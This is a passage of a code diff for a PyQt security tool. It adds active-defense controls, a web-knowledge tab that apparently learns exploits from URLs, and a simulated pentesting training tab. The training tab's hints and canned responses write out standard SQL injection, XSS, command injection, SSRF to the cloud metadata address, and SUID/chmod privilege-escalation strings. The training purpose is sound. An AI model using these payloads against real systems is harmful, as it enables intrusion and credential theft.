+            self.defense_tab_stats_labels['ips_blocked'].setText(str(blocked_count))
+            self.defense_tab_stats_labels['honeypot_hits'].setText(str(stats.get('honeypot_hits', 0)))
+            self.defense_tab_stats_labels['active_honeypots'].setText(str(stats.get('active_honeypots', 0)))
+            self.defense_tab_stats_labels['tracked_ips'].setText(str(limiter_stats.get('tracked_ips', 0)))
+        except Exception as e:
+            logger.warning(f"Failed to update active defense stats: {e}")
+        
+    def _toggle_defense_tab(self):
+        """Toggle defense tab engine state"""
+        if not hasattr(self, 'defense_tab_engine'):
+            QMessageBox.warning(self, "Error", "Autonomous defense module not initialized")
+            return
+        
+        if self.defense_tab_engine.enabled:
+            self.defense_tab_engine.disable()
+            self.defense_enable_btn.setText("Enable Defense")
+            self.defense_status_label.setText("Status: Disabled")
+            self.defense_status_label.setStyleSheet("color: #ff6b6b;")
+            self._append_active_defense_log("🛡️ Active Defense disabled")
+        else:
+            # Get selected defense level
+            level_name = self.defense_tab_level_combo.currentText()
+            from modules.autonomous_defense import DefenseLevel
+            level = DefenseLevel[level_name]
+
+            self._apply_active_defense_tab_config()
+            enabled = self.defense_tab_engine.enable(level)
+            if enabled:
+                self.defense_enable_btn.setText("Disable Defense")
+                self.defense_status_label.setText(f"Status: Enabled ({level_name})")
+                self.defense_status_label.setStyleSheet("color: #51cf66;")
+                self._append_active_defense_log(f"🛡️ Active Defense enabled at level: {level_name}")
+            else:
+                self.defense_status_label.setText("Status: Enable failed")
+                self.defense_status_label.setStyleSheet("color: #ff6b6b;")
+
+        self._update_defense_blocked_ips_log()
+        self._update_active_defense_stats()
+        
+    def _block_ip_from_defense_tab(self):
+        """Block an IP address from the defense tab"""
+        if not hasattr(self, 'defense_tab_engine'):
+            QMessageBox.warning(self, "Error", "Autonomous defense module not initialized")
+            return
+        
+        ip = self.defense_block_input.text().strip()
+        if not ip:
+            QMessageBox.warning(self, "Error", "Please enter an IP address")
+            return
+        
+        # Validate IP format
+        parts = ip.split('.')
+        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
+            QMessageBox.warning(self, "Error", "Invalid IP address format")
+            return
+        
+        try:
+            self.defense_tab_engine.rate_limiter.blocked_ips.add(ip)
+            self.defense_tab_engine._apply_firewall_block(ip, permanent=True)
+            self.defense_tab_engine.stats['ips_blocked'] += 1
+
+            # Update blocked IPs display
+            self._update_defense_blocked_ips_log()
+            self._append_active_defense_log(f"🚫 Manually blocked IP: {ip}")
+            self._update_active_defense_stats()
+            self.defense_block_input.clear()
+            QMessageBox.information(self, "Success", f"IP {ip} has been blocked")
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to block IP: {str(e)}")
+
+    def _unblock_ip_from_defense_tab(self):
+        """Unblock an IP address from the defense tab"""
+        if not hasattr(self, 'defense_tab_engine'):
+            QMessageBox.warning(self, "Error", "Autonomous defense module not initialized")
+            return
+
+        ip = self.defense_block_input.text().strip()
+        if not ip:
+            QMessageBox.warning(self, "Error", "Please enter an IP address")
+            return
+
+        parts = ip.split('.')
+        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
+            QMessageBox.warning(self, "Error", "Invalid IP address format")
+            return
+
+        self.defense_tab_engine.rate_limiter.unblock(ip)
+        self._update_defense_blocked_ips_log()
+        self._append_active_defense_log(f"✅ Manually unblocked IP: {ip}")
+        self._update_active_defense_stats()
+        self.defense_block_input.clear()
+
+    def _on_active_defense_level_changed(self, level_name: str):
+        """Apply defense level change live when defense is enabled."""
+        if not hasattr(self, 'defense_tab_engine') or not self.defense_tab_engine.enabled:
+            return
+
+        from modules.autonomous_defense import DefenseLevel
+        level = DefenseLevel[level_name]
+        self.defense_tab_engine.disable()
+        self._apply_active_defense_tab_config()
+        self.defense_tab_engine.enable(level)
+        self.defense_status_label.setText(f"Status: Enabled ({level_name})")
+        self._append_active_defense_log(f"🔄 Defense level updated to: {level_name}")
+        self._update_active_defense_stats()
+
+    def _on_active_defense_auto_response_changed(self, _: bool):
+        self._apply_active_defense_tab_config()
+        mode = "enabled" if self.defense_auto_response_cb.isChecked() else "disabled"
+        self._append_active_defense_log(f"⚙️ Auto-response {mode}")
+        self._update_active_defense_stats()
+
+    def _on_active_defense_threshold_changed(self, _: float):
+        self._apply_active_defense_tab_config()
+        self._append_active_defense_log(
+            f"⚙️ Block threshold set to {self.defense_block_threshold.value():.2f}"
+        )
+        self._update_active_defense_stats()
+
+    def _on_active_defense_action_taken(self, action_data: dict):
+        ip = action_data.get('ip', 'Unknown')
+        actions = ', '.join(action_data.get('actions', [])) or 'logged'
+        self._append_active_defense_log(f"🤖 Action taken for {ip}: {actions}")
+        self._update_defense_blocked_ips_log()
+        self._update_active_defense_stats()
+
+    def _on_active_defense_threat_mitigated(self, threat_data: dict, actions: list):
+        threat = threat_data.get('threat_type', 'Unknown')
+        ip = threat_data.get('remote_ip', 'Unknown')
+        action_names = [a.value if hasattr(a, 'value') else str(a) for a in actions]
+        self._append_active_defense_log(f"⚔️ Mitigated {threat} from {ip}: {', '.join(action_names)}")
+        self._update_defense_blocked_ips_log()
+        self._update_active_defense_stats()
+        
+    def _update_defense_blocked_ips_log(self):
+        """Update the blocked IPs log from defense tab engine"""
+        if not hasattr(self, 'defense_tab_engine'):
+            return
+        
+        try:
+            # Get blocked IPs from the engine
+            blocked_ips = getattr(self.defense_tab_engine.rate_limiter, 'blocked_ips', set())
+            if blocked_ips:
+                self.defense_blocked_ips.setText('\n'.join(sorted(blocked_ips)))
+            else:
+                self.defense_blocked_ips.setText("No blocked IPs")
+        except Exception as e:
+            logger.warning(f"Failed to update blocked IPs log: {e}")
+
+    def _create_simulations_tab(self) -> QWidget:
+        """Create realistic pentesting simulations with AI guidance and learning"""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        # Header
+        header = QGroupBox("🎮 Pentesting Simulations")
+        header_layout = QVBoxLayout(header)
+        header_layout.addWidget(QLabel("Practice your pentesting skills in safe, simulated environments."))
+        layout.addWidget(header)
+        
+        # Splitter for scenario list and details
+        splitter = QSplitter(Qt.Orientation.Horizontal)
+        
+        # Left side - Available Scenarios
+        scenarios_group = QGroupBox("📋 Available Scenarios")
+        scenarios_layout = QVBoxLayout(scenarios_group)
+        self.scenarios_list = QListWidget()
+        self.scenarios_list.itemSelectionChanged.connect(self._on_scenario_selected)
+        
+        # Populate scenarios
+        scenarios_data = [
+            ("🔓 SQL Injection (Easy)", "SQL Injection", "Practice basic SQL injection techniques"),
+            ("🕸️ XSS Attack (Easy)", "XSS", "Learn about Cross-Site Scripting vulnerabilities"),
+            ("🔐 Authentication Bypass (Medium)", "Auth Bypass", "Bypass weak authentication mechanisms"),
+            ("💉 Command Injection (Medium)", "Command Injection", "Execute arbitrary commands on the target"),
+            ("🎭 SSRF Attack (Medium)", "SSRF", "Server-Side Request Forgery exploitation"),
+            ("🏗️ Web App Pentesting (Hard)", "Web App", "Full web application penetration test"),
+            ("🌐 Network Enumeration (Medium)", "Enumeration", "Discover hosts and services on a network"),
+            ("🔑 Privilege Escalation (Hard)", "Privesc", "Escalate privileges to gain admin access"),
+        ]
+        
+        self.scenarios = {}
+        for display_name, scenario_id, description in scenarios_data:
+            item = QListWidgetItem(display_name)
+            item.setData(Qt.ItemDataRole.UserRole, scenario_id)
+            self.scenarios_list.addItem(item)
+            self.scenarios[scenario_id] = {
+                'name': display_name,
+                'description': description,
+                'difficulty': 'Easy' if 'Easy' in display_name else 'Medium' if 'Medium' in display_name else 'Hard'
+            }
+        
+        scenarios_layout.addWidget(self.scenarios_list)
+        
+        # Scenario controls
+        ctrl_layout = QHBoxLayout()
+        start_btn = QPushButton("▶️ Start Scenario")
+        start_btn.clicked.connect(self._start_simulation)
+        reset_btn = QPushButton("🔄 Reset")
+        reset_btn.clicked.connect(self._reset_simulation)
+        ctrl_layout.addWidget(start_btn)
+        ctrl_layout.addWidget(reset_btn)
+        scenarios_layout.addLayout(ctrl_layout)
+        
+        splitter.addWidget(scenarios_group)
+        
+        # Right side - Scenario Details
+        details_group = QGroupBox("📝 Scenario Details")
+        details_layout = QVBoxLayout(details_group)
+        
+        # Difficulty badge
+        difficulty_layout = QHBoxLayout()
+        difficulty_layout.addWidget(QLabel("Difficulty:"))
+        self.difficulty_label = QLabel("—")
+        self.difficulty_label.setStyleSheet("color: #e94560; font-weight: bold;")
+        difficulty_layout.addWidget(self.difficulty_label)
+        difficulty_layout.addStretch()
+        details_layout.addLayout(difficulty_layout)
+        
+        # Description
+        details_layout.addWidget(QLabel("Description:"))
+        self.scenario_description = QTextEdit()
+        self.scenario_description.setReadOnly(True)
+        self.scenario_description.setMaximumHeight(100)
+        details_layout.addWidget(self.scenario_description)
+        
+        # Objectives
+        details_layout.addWidget(QLabel("Objectives:"))
+        self.scenario_objectives = QTextEdit()
+        self.scenario_objectives.setReadOnly(True)
+        self.scenario_objectives.setMaximumHeight(150)
+        details_layout.addWidget(self.scenario_objectives)
+        
+        # Hints section
+        details_layout.addWidget(QLabel("Hints (Click to reveal):"))
+        self.hints_list = QListWidget()
+        self.hints_list.itemClicked.connect(self._reveal_hint)
+        self.hints_list.setMaximumHeight(120)
+        details_layout.addWidget(self.hints_list)
+        
+        details_layout.addStretch()
+        splitter.addWidget(details_group)
+        
+        splitter.setStretchFactor(0, 1)
+        splitter.setStretchFactor(1, 1)
+        layout.addWidget(splitter)
+        
+        # Simulation environment
+        sim_group = QGroupBox("🖥️ Simulation Environment")
+        sim_layout = QVBoxLayout(sim_group)
+        
+        # Target info
+        target_layout = QHBoxLayout()
+        target_layout.addWidget(QLabel("Target URL:"))
+        self.target_url_input = QLineEdit()
+        self.target_url_input.setReadOnly(True)
+        self.target_url_input.setPlaceholderText("http://vulnerable-app.local")
+        target_layout.addWidget(self.target_url_input)
+        sim_layout.addLayout(target_layout)
+        
+        # Command/Payload input
+        sim_layout.addWidget(QLabel("Test Payload:"))
+        self.payload_input = QPlainTextEdit()
+        self.payload_input.setPlaceholderText("Enter your exploit payload or SQL injection here...")
+        self.payload_input.setMaximumHeight(100)
+        sim_layout.addWidget(self.payload_input)
+        
+        # Execute button
+        exec_btn = QPushButton("🚀 Execute Payload")
+        exec_btn.clicked.connect(self._execute_payload)
+        sim_layout.addWidget(exec_btn)
+        
+        # Results
+        sim_layout.addWidget(QLabel("📊 Results:"))
+        self.simulation_output = QTextEdit()
+        self.simulation_output.setReadOnly(True)
+        self.simulation_output.setFont(QFont("Consolas", 9))
+        sim_layout.addWidget(self.simulation_output)
+        
+        # Score tracking
+        score_layout = QHBoxLayout()
+        score_layout.addWidget(QLabel("Score: "))
+        self.score_label = QLabel("0/100")
+        self.score_label.setStyleSheet("color: #00fff2; font-weight: bold; font-size: 14px;")
+        score_layout.addWidget(self.score_label)
+        score_layout.addWidget(QLabel("  |  Status: "))
+        self.status_label = QLabel("Not Started")
+        self.status_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
+        score_layout.addWidget(self.status_label)
+        score_layout.addStretch()
+        sim_layout.addLayout(score_layout)
+        
+        layout.addWidget(sim_group)
+        
+        # Initialize state
+        self.current_scenario = None
+        self.simulation_running = False
+        
+        return widget
     
+    def _on_scenario_selected(self):
+        """Handle scenario selection"""
+        current_item = self.scenarios_list.currentItem()
+        if not current_item:
+            return
+        
+        scenario_id = current_item.data(Qt.ItemDataRole.UserRole)
+        scenario = self.scenarios.get(scenario_id)
+        
+        if scenario:
+            self.difficulty_label.setText(scenario['difficulty'])
+            self.scenario_description.setText(scenario['description'])
+            
+            # Set objectives based on scenario type
+            objectives_map = {
+                'SQL Injection': 'Bypass login form using SQL injection.\nExtract user credentials from the database.',
+                'XSS': 'Inject JavaScript to steal session cookies.\nBypass content security policies.',
+                'Auth Bypass': 'Gain access without valid credentials.\nExploit weak authentication logic.',
+                'Command Injection': 'Execute system commands through input fields.\nAchieve remote code execution.',
+                'SSRF': 'Access internal resources via server requests.\nExfiltrate metadata from internal services.',
+                'Web App': 'Identify all vulnerabilities in the application.\nDocument findings and create a report.',
+                'Enumeration': 'Discover all hosts and open ports.\nIdentify running services and versions.',
+                'Privesc': 'Elevate privileges from user to root.\nMaintain persistence on the system.',
+            }
+            
+            self.scenario_objectives.setText(objectives_map.get(scenario_id, "Complete the scenario objectives."))
+            
+            # Set hints
+            hints_map = {
+                'SQL Injection': ['Check login form for input validation', 'Try basic payloads like " OR "1"="1', 'Look at error messages for clues'],
+                'XSS': ['Find input fields that reflect user data', 'Test with <script>alert("xss")</script>', 'Check for HTML entity encoding'],
+                'Auth Bypass': ['Check for hardcoded credentials', 'Look for logic flaws in authentication', 'Try common default passwords'],
+                'Command Injection': ['Look for fields that execute system commands', 'Try command separators like ; or |', 'Use output redirection to see results'],
+                'SSRF': ['Identify URL input fields', 'Try localhost and internal IP addresses', 'Check for URL filtering bypass techniques'],
+                'Web App': ['Start with information gathering', 'Test each input field systematically', 'Review client-side code for vulnerabilities'],
+                'Enumeration': ['Use tools like nmap for port scanning', 'Check common ports (22, 80, 443)', 'Identify service versions for known exploits'],
+                'Privesc': ['Look for SUID binaries', 'Check for weak file permissions', 'Search for sudo misconfigurations'],
+            }
+            
+            self.hints_list.clear()
+            for hint in hints_map.get(scenario_id, ['Start the scenario to get hints']):
+                self.hints_list.addItem(QListWidgetItem(f"💡 {hint}"))
+            
+            self.current_scenario = scenario_id
+            self.target_url_input.setText("http://vulnerable-app.local/scenario/" + scenario_id.lower())
+    
+    def _reveal_hint(self, item):
+        """Reveal a hint"""
+        hint_text = item.text().replace("💡 ", "")
+        self._add_chat_message("system", f"💡 Hint: {hint_text}")
+    
+    def _start_simulation(self):
+        """Start a simulation scenario"""
+        if not self.current_scenario:
+            self._add_chat_message("system", "❌ Please select a scenario first")
+            return
+        
+        self.simulation_running = True
+        self.simulation_output.clear()
+        self.payload_input.clear()
+        self.score_label.setText("0/100")
+        self.status_label.setText("In Progress")
+        self.status_label.setStyleSheet("color: #00fff2; font-weight: bold;")
+        
+        scenario = self.scenarios[self.current_scenario]
+        output = f"""🎮 SIMULATION STARTED
+    ═══════════════════════════════════════
+    Scenario: {scenario['name']}
+    Difficulty: {scenario['difficulty']}
+    Target: {self.target_url_input.text()}
+    ═══════════════════════════════════════
+
+    Enter your payloads in the test field and click "Execute Payload" to simulate your attack.
+    This is a safe, sandboxed environment for learning and practice.
+
+    Tips:
+    • Read all available hints carefully
+    • Test your assumptions methodically
+    • Document what you find
+    • Think about why vulnerabilities exist
+
+    Good luck! 🚀
+    """
+        self.simulation_output.setText(output)
+    
+    def _reset_simulation(self):
+        """Reset the simulation"""
+        self.simulation_running = False
+        self.simulation_output.clear()
+        self.payload_input.clear()
+        self.score_label.setText("0/100")
+        self.status_label.setText("Not Started")
+        self.status_label.setStyleSheet("color: #ff6b6b; font-weight: bold;")
+    
+    def _execute_payload(self):
+        """Execute a payload against the simulation target"""
+        if not self.simulation_running:
+            self._add_chat_message("system", "❌ Start a simulation first")
+            return
+        
+        payload = self.payload_input.toPlainText().strip()
+        if not payload:
+            self._add_chat_message("system", "❌ Enter a payload first")
+            return
+        
+        # Simulate payload execution based on scenario type
+        scenario_id = self.current_scenario
+        response = self._simulate_payload_response(scenario_id, payload)
+        
+        current_output = self.simulation_output.toPlainText()
+        self.simulation_output.setText(current_output + f"\n\n$ {payload}\n{response}")
+        
+        # Update score
+        self._update_simulation_score(scenario_id, payload, response)
+        
+        # Clear input for next attempt
+        self.payload_input.clear()
+    
+    def _simulate_payload_response(self, scenario_id: str, payload: str) -> str:
+        """Simulate target response to a payload"""
+        responses = {
+            'SQL Injection': {
+                "admin'--": "✓ Login successful! Admin access granted.",
+                "' OR '1'='1": "✓ Login successful! Admin access granted.",
+                "' OR 1=1--": "✓ Login successful! Admin access granted.",
+                "UNION SELECT": "Retrieving user database... Users found: admin, user1, user2",
+                "default": "❌ Login failed. Invalid credentials."
+            },
+            'XSS': {
+                "<script>alert('xss')</script>": "✓ XSS Payload Executed! Session cookie stolen: sess_12345abcde",
+                "<img src=x onerror=alert('xss')>": "✓ XSS Payload Executed! Session cookie stolen: sess_12345abcde",
+                "javascript:alert('xss')": "⚠️  Payload blocked by CSP, but technique documented.",
+                "default": "❌ Payload blocked or not reflected."
+            },
+            'Auth Bypass': {
+                "admin": "⚠️  Username found, needs password",
+                "admin:admin": "✓ Authentication Bypassed! Access granted.",
+                "admin:password": "✓ Authentication Bypassed! Access granted.",
+                "root:root": "✓ Authentication Bypassed! Root access granted.",
+                "default": "❌ Invalid credentials."
+            },
+            'Command Injection': {
+                "id": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+                "; cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data...",
+                "| whoami": "www-data",
+                "$(id)": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+                "default": "❌ Command not executed."
+            },
+            'SSRF': {
+                "http://localhost:8080": "✓ Internal service discovered: Admin Dashboard (localhost:8080)",
+                "http://169.254.169.254": "✓ AWS Metadata Service accessed: Found API keys and credentials",
+                "http://internal.service": "✓ Internal service found: Database server responding",
+                "file:///etc/passwd": "⚠️  File protocol detected but blocked",
+                "default": "❌ URL rejected or not accessible."
+            },
+            'Web App': {
+                "test": "✓ Found 1 vulnerability",
+                "admin": "✓ Found 2 vulnerabilities",
+                "'; DROP TABLE": "⚓ SQL Injection confirmed",
+                "<script>": "⚓ XSS confirmed",
+                "default": "Performing analysis..."
+            },
+            'Enumeration': {
+                "22": "✓ SSH (OpenSSH 7.4)",
+                "80": "✓ HTTP (Apache 2.4.6)",
+                "443": "✓ HTTPS (Apache 2.4.6)",
+                "3306": "✓ MySQL (5.7.32)",
+                "default": "❌ Port closed or filtered."
+            },
+            'Privesc': {
+                "sudo -l": "User may run the following commands without password: /usr/bin/python3",
+                "find / -perm -4000": "✓ Found SUID binaries: /usr/bin/find, /usr/bin/chmod",
+                "cat /etc/sudoers": "✓ Sudoers configuration accessed!",
+                "chmod +s /bin/bash": "✓ Privilege escalation successful!",
+                "default": "Permission denied."
+            }
+        }
+        
+        scenario_responses = responses.get(scenario_id, {})
+        # Check if payload exactly matches a key
+        if payload in scenario_responses:
+            return scenario_responses[payload]
+        # Check if payload contains keywords
+        for key, response in scenario_responses.items():
+            if key != 'default' and key.lower() in payload.lower():
+                return response
+        # Return default response
+        return scenario_responses.get('default', "❌ No response from target.")
+    
+    def _update_simulation_score(self, scenario_id: str, payload: str, response: str):
+        """Update the simulation score based on progress"""
+        current_score = int(self.score_label.text().split('/')[0])
+        
+        # Check for success indicators
+        if '✓' in response:
+            new_score = min(100, current_score + 20)
+        elif '⚓' in response:
+            new_score = min(100, current_score + 15)
+        elif '⚠️' in response:
+            new_score = min(100, current_score + 10)
+        else:
+            new_score = current_score + 1
+        
+        self.score_label.setText(f"{new_score}/100")
+        
+        # Update status
+        if new_score >= 80:
+            self.status_label.setText("✅ Completed!")
+            self.status_label.setStyleSheet("color: #4CAF50; font-weight: bold;")
+        elif new_score >= 50:
+            self.status_label.setText("⏳ Making Progress...")
+            self.status_label.setStyleSheet("color: #00fff2; font-weight: bold;")
+
+    def _create_modules_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        # Splitter for available and loaded modules
+        splitter = QSplitter(Qt.Orientation.Horizontal)
+
+        # Left side - Available Modules
+        available_group = QGroupBox("🧩 Available Modules")
+        available_layout = QVBoxLayout(available_group)
+        self.module_list = QListWidget()
+        self.module_list.setSelectionMode(QListWidget.SelectionMode.SingleSelection)
+        available_layout.addWidget(self.module_list)
+
+        # Load and Execute Buttons
+        btn_layout = QHBoxLayout()
+        self.load_btn = QPushButton("📥 Load Module")
+        self.load_btn.clicked.connect(self._load_selected_module)
+        btn_layout.addWidget(self.load_btn)
+
+        refresh_btn = QPushButton("🔄 Refresh")
+        refresh_btn.clicked.connect(self._refresh_module_list)
+        btn_layout.addWidget(refresh_btn)
+
+        available_layout.addLayout(btn_layout)
+        splitter.addWidget(available_group)
+
+        # Right side - Loaded Modules
+        loaded_group = QGroupBox("✅ Loaded Modules")
+        loaded_layout = QVBoxLayout(loaded_group)
+        self.loaded_modules_list = QListWidget()
+        self.loaded_modules_list.setSelectionMode(QListWidget.SelectionMode.SingleSelection)
+        loaded_layout.addWidget(self.loaded_modules_list)
+
+        exec_layout = QHBoxLayout()
+        self.exec_btn = QPushButton("▶ Execute Module")
+        self.exec_btn.clicked.connect(self._execute_selected_module)
+        self.exec_btn.setEnabled(False)
+        exec_layout.addWidget(self.exec_btn)
+
+        unload_btn = QPushButton("❌ Unload Module")
+        unload_btn.clicked.connect(self._unload_selected_module)
+        exec_layout.addWidget(unload_btn)
+
+        loaded_layout.addLayout(exec_layout)
+        splitter.addWidget(loaded_group)
+
+        layout.addWidget(splitter)
+
+        # Output Log
+        layout.addWidget(QLabel("🧾 Module Output:"))
+        self.module_output = QTextEdit()
+        self.module_output.setReadOnly(True)
+        self.module_output.setFont(QFont("Consolas", 10))
+        layout.addWidget(self.module_output)
+
+        self._refresh_module_list()
+        self._refresh_loaded_modules_list()
+
+        return widget
     def _start_network_monitor(self):
         if self.network_monitor and self.network_monitor.isRunning():
             return
@@ -3202,6 +5698,10 @@ class HadesGUI(QMainWindow):
         self.network_monitor.set_defense_mode(self.defense_mode_check.isChecked())
         self.network_monitor.set_learning_mode(self.learning_mode_check.isChecked())
         
+        # Initialize Autonomous Defense Engine
+        if HAS_AUTONOMOUS_DEFENSE and (self.autonomous_defense_check.isChecked() or self.defense_mode_check.isChecked()):
+            self._init_autonomous_defense(use_network_monitor=True)
+        
         self.network_monitor.start()
         
         self.monitor_start_btn.setEnabled(False)
@@ -3212,11 +5712,121 @@ class HadesGUI(QMainWindow):
         if self.network_monitor:
             self.network_monitor.stop()
             self.network_monitor.wait()
-            
+            self.network_monitor = None
+
+        # Stop monitor-attached Autonomous Defense instance
+        if self.autonomous_defense:
+            self.autonomous_defense.disable()
+            self.autonomous_defense = None
+
+        # Keep defense available even when monitor is off if requested by user.
+        if HAS_AUTONOMOUS_DEFENSE and (self.autonomous_defense_check.isChecked() or self.defense_mode_check.isChecked()):
+            self._init_autonomous_defense(use_network_monitor=False)
+    
         self.monitor_start_btn.setEnabled(True)
         self.monitor_stop_btn.setEnabled(False)
         self.net_status_label.setText("🔴 Network Monitor STOPPED")
         self._add_chat_message("system", "🔴 Network Monitor stopped")
+
+    def _init_autonomous_defense(self, use_network_monitor: bool = True):
+        """Initialize the autonomous defense engine"""
+        if not HAS_AUTONOMOUS_DEFENSE:
+            self._add_chat_message("system", "⚠️ Autonomous defense module not available")
+            return
+
+        try:
+            monitor_ref = self.network_monitor if use_network_monitor else None
+            self.autonomous_defense = AutonomousDefenseEngine(
+                kb=self.ai.kb,
+                network_monitor=monitor_ref
+            )
+            self.standalone_defense_mode = not use_network_monitor
+            
+            # Set defense level from combo
+            level_map = {
+                0: DefenseLevel.PASSIVE,
+                1: DefenseLevel.REACTIVE,
+                2: DefenseLevel.PROACTIVE,
+                3: DefenseLevel.AGGRESSIVE
+            }
+            defense_level = level_map.get(self.defense_level_combo.currentIndex(), DefenseLevel.REACTIVE)
+            
+            # Set callbacks
+            self.autonomous_defense.on_action_taken = self._on_defense_action
+            self.autonomous_defense.on_threat_mitigated = self._on_threat_mitigated
+            
+            self.autonomous_defense.enable(defense_level)
+            
+            level_name = defense_level.name
+            mode_name = "monitor-attached" if use_network_monitor else "standalone"
+            self._add_chat_message("system",
+                f"🤖 Autonomous Defense ENABLED ({mode_name}) at {level_name} level\n"
+                f"   • Honeypot deployment: {'Active' if defense_level.value >= 2 else 'Standby'}\n"
+                f"   • Rate limiting: Active\n"
+                f"   • Threat auto-response: Active\n"
+                f"   • Deceptive responses: {'Active' if defense_level.value >= 2 else 'On-demand'}")
+        except Exception as e:
+            self._add_chat_message("system", f"⚠️ Failed to initialize autonomous defense: {str(e)}")
+    
+    def _toggle_autonomous_defense(self, enabled: bool):
+        """Toggle autonomous defense on/off"""
+        if enabled:
+            monitor_running = self.network_monitor and self.network_monitor.isRunning()
+            self._init_autonomous_defense(use_network_monitor=bool(monitor_running))
+        else:
+            # Keep defense active if Active Defense toggle is still enabled.
+            if self.autonomous_defense and not self.defense_mode_check.isChecked():
+                self.autonomous_defense.disable()
+                self.autonomous_defense = None
+                self.standalone_defense_mode = False
+                self._add_chat_message("system", "🤖 Autonomous Defense DISABLED")
+    
+    def _on_defense_level_changed(self, index: int):
+        """Handle defense level change"""
+        if not self.autonomous_defense or not self.autonomous_defense.enabled:
+            return
+        
+        level_map = {
+            0: DefenseLevel.PASSIVE,
+            1: DefenseLevel.REACTIVE,
+            2: DefenseLevel.PROACTIVE,
+            3: DefenseLevel.AGGRESSIVE
+        }
+        new_level = level_map.get(index, DefenseLevel.REACTIVE)
+        
+        # Reinitialize with new level and preserve standalone/monitor mode.
+        use_network_monitor = bool(self.network_monitor and self.network_monitor.isRunning() and not self.standalone_defense_mode)
+        self.autonomous_defense.disable()
+        self._init_autonomous_defense(use_network_monitor=use_network_monitor)
+        self._add_chat_message("system", f"🤖 Defense level changed to: {new_level.name}")
+    
+    def _on_defense_action(self, action_data: dict):
+        """Handle autonomous defense action taken"""
+        actions = action_data.get('actions', [])
+        ip = action_data.get('ip', 'Unknown')
+        threat = action_data.get('threat', 'Unknown')
+        
+        action_str = ', '.join(actions) if actions else 'logged'
+        self.net_status_label.setText(f"🤖 AUTO-DEFENSE: {action_str} for {ip} ({threat})")
+        
+        # Update stats
+        if 'auto_mitigated' in self.net_stats_labels:
+            current = int(self.net_stats_labels['auto_mitigated'].text())
+            self.net_stats_labels['auto_mitigated'].setText(str(current + 1))
+    
+    def _on_threat_mitigated(self, threat_data: dict, actions: list):
+        """Handle threat mitigation event"""
+        threat_type = threat_data.get('threat_type', 'Unknown')
+        remote_ip = threat_data.get('remote_ip', 'Unknown')
+        action_names = [a.value if hasattr(a, 'value') else str(a) for a in actions]
+        
+        msg = f"⚔️ AUTONOMOUS DEFENSE: {threat_type} from {remote_ip}\n   Actions: {', '.join(action_names)}"
+        self._add_chat_message("threat", msg)
+        
+        # Update honeypot stats if applicable
+        if self.autonomous_defense and 'honeypot_hits' in self.net_stats_labels:
+            stats = self.autonomous_defense.get_stats()
+            self.net_stats_labels['honeypot_hits'].setText(str(stats.get('honeypot_hits', 0)))
     def _create_web_knowledge_tab(self) -> QWidget:
         widget = QWidget()
         layout = QVBoxLayout(widget)
@@ -3226,35 +5836,244 @@ class HadesGUI(QMainWindow):
         title.setStyleSheet("color: #e94560;")
         layout.addWidget(title)
 
+        controls_layout = QHBoxLayout()
+        self.web_knowledge_url_input = QLineEdit()
+        self.web_knowledge_url_input.setPlaceholderText("https://example.com/security-advisory")
+        controls_layout.addWidget(self.web_knowledge_url_input)
+
+        learn_btn = QPushButton("🌐 Learn From Website")
+        learn_btn.clicked.connect(self._learn_from_web_knowledge_tab)
+        controls_layout.addWidget(learn_btn)
+
+        refresh_btn = QPushButton("🔁 Refresh Web Knowledge")
+        refresh_btn.clicked.connect(self._display_recent_web_knowledge)
+        controls_layout.addWidget(refresh_btn)
+
+        sync_amp_btn = QPushButton("🧠 Sync Amp Threads")
+        sync_amp_btn.clicked.connect(self._sync_amp_threads_from_tab)
+        controls_layout.addWidget(sync_amp_btn)
+        layout.addLayout(controls_layout)
+
+        self.web_knowledge_status = QLabel("Ready")
+        self.web_knowledge_status.setStyleSheet("color: #69db7c;")
+        layout.addWidget(self.web_knowledge_status)
+
         self.web_knowledge_display = QTextEdit()
         self.web_knowledge_display.setReadOnly(True)
         self.web_knowledge_display.setFont(QFont("Consolas", 11))
         layout.addWidget(self.web_knowledge_display)
 
-        refresh_btn = QPushButton("🔁 Refresh Web Knowledge")
-        refresh_btn.clicked.connect(self._display_recent_web_knowledge)
-        layout.addWidget(refresh_btn)
+        self._display_recent_web_knowledge()
 
         return widget
+
+    def _learn_from_web_knowledge_tab(self):
+        """Learn exploit/security patterns from a URL entered in the Web Knowledge tab."""
+        if not hasattr(self, 'web_knowledge_url_input'):
+            return
+
+        url = self.web_knowledge_url_input.text().strip()
+        if not url:
+            self.web_knowledge_status.setText("⚠ Enter a website URL to learn from.")
+            self.web_knowledge_status.setStyleSheet("color: #ffa94d;")
+            return
+
+        if not url.startswith(('http://', 'https://')):
+            url = f"https://{url}"
+            self.web_knowledge_url_input.setText(url)
+
+        self.web_knowledge_status.setText(f"📡 Learning from {url}...")
+        self.web_knowledge_status.setStyleSheet("color: #4dabf7;")
+        QApplication.processEvents()
+
+        result = self.ai.learn_from_url(url)
+
+        if result.get('error'):
+            self.web_knowledge_status.setText(f"❌ Learning failed: {result['error']}")
+            self.web_knowledge_status.setStyleSheet("color: #ff6b6b;")
+            return
+
+        patterns_found = result.get('patterns_found', 0)
+        exploits_learned = result.get('exploits_learned', 0)
+        self.web_knowledge_status.setText(
+            f"✅ Learned from {url} | Patterns: {patterns_found} | Exploits: {exploits_learned}"
+        )
+        self.web_knowledge_status.setStyleSheet("color: #69db7c;")
+
+        self._display_recent_web_knowledge()
+
+        # Keep user flow smooth by also updating learned exploits tab if available.
+        if hasattr(self, 'learned_table'):
+            self._refresh_learned()
+
+    def _sync_amp_threads_from_tab(self):
+        """Manually sync local amp thread exports into the learning database."""
+        self.web_knowledge_status.setText("🧠 Syncing amp threads learning folder...")
+        self.web_knowledge_status.setStyleSheet("color: #4dabf7;")
+        QApplication.processEvents()
+
+        result = self.ai.learn_from_amp_threads_folder()
+        scanned = result.get('scanned_files', 0)
+        imported = result.get('imported_threads', 0)
+        skipped = result.get('skipped_threads', 0)
+        failed = result.get('failed_threads', 0)
+        messages = result.get('total_messages', 0)
+
+        if scanned == 0:
